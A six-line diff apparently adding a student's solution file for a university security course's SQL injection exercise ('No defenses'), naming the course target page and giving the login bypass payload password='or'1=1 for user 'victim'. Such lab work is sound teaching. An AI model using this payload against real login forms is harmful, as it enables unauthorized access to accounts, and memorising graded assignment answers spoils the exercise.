@@ -1,0 +1,6 @@
+1.0 No defenses
+Target: https://eecs388.org/project2/sqlinject0/
+Submission: sql_0.txt
+
+username=victim
+password='or'1=1
